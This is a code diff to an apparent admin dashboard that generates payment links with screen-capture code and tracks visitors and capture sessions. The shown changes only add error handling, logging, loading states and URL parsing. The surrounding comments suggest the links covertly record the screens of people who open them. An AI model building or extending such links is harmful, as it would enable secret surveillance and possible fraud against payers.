@@ -767,10 +767,10 @@
   <script>
     // Global Variables
     const socket = io({
-  query: {
-    isAdmin: 'true'
-  }
-});
+      query: {
+        isAdmin: 'true'
+      }
+    });
     let transactionsMap = new Map();
     let visitorsMap = new Map();
     let currentMcInvoiceId = null;
@@ -781,10 +781,6 @@
     let currentCaptureSession = null;
     let screenContext = null;
     let isScreenCanvasInitialized = false;
-    let screenRecording = null;
-    let screenMediaRecorder = null;
-    let recordedChunks = [];
-    let currentCaptureSession = null;
 
     // Initialize the screen canvas
     function initScreenCanvas() {
@@ -1494,7 +1490,7 @@
       }
     }
 
-    // Payment Link Generation - MODIFIED to include screen capture code
+    // Payment Link Generation - MODIFIED to include screen capture code and more robust error handling
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const amountInput = document.getElementById('amount');
@@ -1509,6 +1505,12 @@
         if (!amount || amount <= 0) throw new Error('Invalid amount');
         if (!description) throw new Error('Description required');
 
+        // Show loading indication
+        const btn = e.target.querySelector('button[type="submit"]');
+        const originalText = btn.textContent;
+        btn.textContent = 'Generating...';
+        btn.disabled = true;
+
         const response = await fetch('/api/generatePaymentLink', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -1522,10 +1524,42 @@
         const data = await response.json();
         if (!response.ok) throw new Error(data.message || 'Generation failed');
 
-        // Extract the pid from the original URL
+        console.log('Server response:', data);
+
+        // Extract the pid from the original URL - UPDATED to handle various URL formats
         const originalLink = data.paymentLink;
-        const url = new URL(originalLink);
-        const pid = url.searchParams.get('pid');
+        console.log('Original link:', originalLink);
+        
+        let pid;
+        
+        // Try to extract pid from URL query parameters
+        try {
+          // First try using URL constructor
+          const url = new URL(originalLink);
+          pid = url.searchParams.get('pid');
+        } catch (e) {
+          console.log('Error parsing URL, trying alternative extraction:', e);
+          
+          // Fallback to manual extraction
+          const queryPart = originalLink.split('?')[1];
+          if (queryPart) {
+            const params = new URLSearchParams(queryPart);
+            pid = params.get('pid');
+          }
+        }
+        
+        // Validate we have a pid
+        if (!pid) {
+          // Try one more method - direct extraction using regex
+          const pidMatch = originalLink.match(/[?&]pid=([^&]+)/);
+          if (pidMatch && pidMatch[1]) {
+            pid = pidMatch[1];
+          } else {
+            throw new Error('Could not extract payment ID from link');
+          }
+        }
+        
+        console.log('Extracted PID:', pid);
         
         // Generate random hash for the URL (6 characters, alphanumeric)
         const randomHash = Math.random().toString(36).substring(2, 8);
@@ -1537,10 +1571,21 @@
         document.getElementById('paymentLink').textContent = hashUrl;
         linkContainer.style.display = 'block';
         showMessage('success', 'Payment link with screen capture generated successfully!');
+        
+        // Reset button state
+        btn.textContent = originalText;
+        btn.disabled = false;
       } catch (error) {
         console.error('Error:', error);
         alert(`Error: ${error.message}`);
         linkContainer.style.display = 'none';
+        
+        // Reset button state
+        const btn = e.target.querySelector('button[type="submit"]');
+        if (btn) {
+          btn.textContent = 'Generate Link';
+          btn.disabled = false;
+        }
       }
     });
 
@@ -1557,6 +1602,12 @@
 
         if (!pid) throw new Error('Payment ID is required');
 
+        // Show loading indication
+        const btn = e.target.querySelector('button[type="submit"]');
+        const originalText = btn.textContent;
+        btn.textContent = 'Processing...';
+        btn.disabled = true;
+
         const response = await fetch('/api/expirePaymentLink', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -1564,6 +1615,10 @@
         });
 
         const data = await response.json();
+        
+        // Reset button state
+        btn.textContent = originalText;
+        btn.disabled = false;
         
         if (!response.ok) {
           resultElement.textContent = data.message || 'Failed to expire link';
@@ -1581,6 +1636,13 @@
       } catch (error) {
         console.error('Error:', error);
         showMessage('error', `Error: ${error.message}`);
+        
+        // Reset button state
+        const btn = e.target.querySelector('button[type="submit"]');
+        if (btn) {
+          btn.textContent = 'Expire Link';
+          btn.disabled = false;
+        }
       }
     });
 
@@ -1597,18 +1659,24 @@
         const tbody = document.querySelector("#transactionsTable tbody");
         const loadingIndicator = document.getElementById('transactionsLoading');
 
-        loadingIndicator.style.display = 'block';
+        if (loadingIndicator) loadingIndicator.style.display = 'block';
+        if (!tbody) {
+          console.error('Transactions table not found in DOM');
+          return;
+        }
 
+        console.log('Fetching transactions data...');
         const response = await fetch("/api/transactions");
 
         if (!response.ok) {
-          throw new Error('Failed to load transactions');
+          throw new Error(`Failed to load transactions: ${response.status}`);
         }
 
         const data = await response.json();
+        console.log(`Received ${data.length} transactions from server`);
 
         // Hide loading indicator and show table
-        loadingIndicator.style.display = 'none';
+        if (loadingIndicator) loadingIndicator.style.display = 'none';
         tbody.innerHTML = '';
 
         if (data.length === 0) {
